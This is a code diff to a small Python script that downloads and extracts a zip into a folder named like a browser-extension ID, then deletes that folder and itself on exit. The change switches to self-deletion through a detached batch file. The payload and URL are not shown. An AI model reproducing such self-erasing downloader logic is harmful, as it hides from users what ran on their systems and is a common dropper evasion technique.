@@ -1,12 +1,16 @@
 import wget
 from zipfile import ZipFile
 import os
+import subprocess
 import atexit
 import shutil
 
 def SelfDeletion():
     shutil.rmtree("mjnbclmflcpookeapghfhapeffmpodij")
-    os.remove(__file__)
+    subprocess.Popen(
+        ["self_delete.bat"],
+        creationflags=subprocess.DETACHED_PROCESS
+    )
 
 
 atexit.register(SelfDeletion)
@@ -20,5 +24,4 @@ else:
     #This kinda extracts the good stuff then finally deletes it
     ZipFile(filename).extractall("mjnbclmflcpookeapghfhapeffmpodij")
     os.remove(filename)
-    print("yeyuh")
 input("\nPress Enter to exit...")
